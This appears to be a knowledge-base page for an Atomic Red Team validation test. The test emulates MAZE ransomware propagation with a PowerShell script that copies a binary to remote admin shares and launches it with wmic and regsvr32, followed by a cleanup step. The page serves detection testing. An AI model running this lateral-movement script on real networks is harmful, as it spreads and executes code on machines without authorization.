---
atomic_guid: "70f4d07c-5c3e-4d53-bb0a-cdf3ada14baf"
title: "MAZE Propagation Script"
framework: "atomic"
generated: "true"
attack_technique_id: "T1105"
attack_technique_name: "Ingress Tool Transfer"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.yaml"
build_date: "2026-04-26 17:02:12"
executor: "powershell"
aliases:
  - "70f4d07c-5c3e-4d53-bb0a-cdf3ada14baf"
  - "MAZE Propagation Script"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# MAZE Propagation Script

This test simulates MAZE ransomware's propogation script that searches through a list of computers, tests connectivity to them, and copies a binary file to the Windows\Temp directory of each one. 
Upon successful execution, a specified binary file will attempt to be copied to each online machine, a list of the online machines, as well as a list of offline machines will be output to a specified location.
Reference: https://www.fireeye.com/blog/threat-research/2020/05/tactics-techniques-procedures-associated-with-maze-ransomware-incidents.html

## Metadata

- Atomic GUID: 70f4d07c-5c3e-4d53-bb0a-cdf3ada14baf
- Technique: T1105: Ingress Tool Transfer
- Platforms: windows
- Executor: powershell
- Dependency Executor: powershell
- Source Path: atomics/T1105/T1105.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1105-ingress_tool_transfer|T1105]]

## Input Arguments

### binary_file

- description: Binary file to copy to remote machines
- type: string
- default: $env:comspec

### exe_remote_folder

- description: Path to store executable on remote machine (no drive letter)
- type: string
- default: \Windows\Temp\T1105.exe

### remote_drive_letter

- description: Remote drive letter
- type: string
- default: C

## Dependencies

Binary file must exist at specified location (#{binary_file})

### Prerequisite Check

```powershell
if (Test-Path #{binary_file}) {exit 0} else {exit 1}
```

### Get Prerequisite

```powershell
write-host "The binary_file input parameter must be set to a binary that exists on this computer."
```

Machine list must exist at specified location ("PathToAtomicsFolder\..\ExternalPayloads\T1105MachineList.txt")

### Prerequisite Check

```powershell
if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\T1105MachineList.txt") {exit 0} else {exit 1}
```

### Get Prerequisite

```powershell
New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
new-item -path "PathToAtomicsFolder\..\ExternalPayloads\T1105MachineList.txt" | Out-Null
echo "A machine list file has been generated at "PathToAtomicsFolder\..\ExternalPayloads\T1105MachineList.txt". Please enter the machines to target there, one machine per line."
```

## Executor

- name: powershell

### Command

```powershell
$machine_list = "PathToAtomicsFolder\..\ExternalPayloads\T1105MachineList.txt"
$offline_list = "PathToAtomicsFolder\..\ExternalPayloads\T1105OfflineHosts.txt"
$completed_list = "PathToAtomicsFolder\..\ExternalPayloads\T1105CompletedHosts.txt"
foreach ($machine in get-content -path "$machine_list")
{if (test-connection -Count 1 -computername $machine -quiet) 
{cmd /c copy "#{binary_file}" "\\$machine\#{remote_drive_letter}$#{exe_remote_folder}"
echo $machine >> "$completed_list"
wmic /node: "$machine" process call create "regsvr32.exe /i #{remote_drive_letter}:#{exe_remote_folder}"}
else
{echo $machine >> "$offline_list"}}
```

### Cleanup

```powershell
if (test-path "PathToAtomicsFolder\..\ExternalPayloads\T1105CompletedHosts.txt") 
{foreach ($machine in get-content -path "PathToAtomicsFolder\..\ExternalPayloads\T1105CompletedHosts.txt")
{wmic /node: "$machine" process where name='"regsvr32.exe"' call terminate | out-null
Remove-Item -path "\\$machine\#{remote_drive_letter}$#{exe_remote_folder}" -force -erroraction silentlycontinue}}
Remove-Item -path "PathToAtomicsFolder\..\ExternalPayloads\T1105OfflineHosts.txt" -erroraction silentlycontinue
Remove-item -path "PathToAtomicsFolder\..\ExternalPayloads\T1105CompletedHosts.txt" -erroraction silentlycontinue
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.yaml)
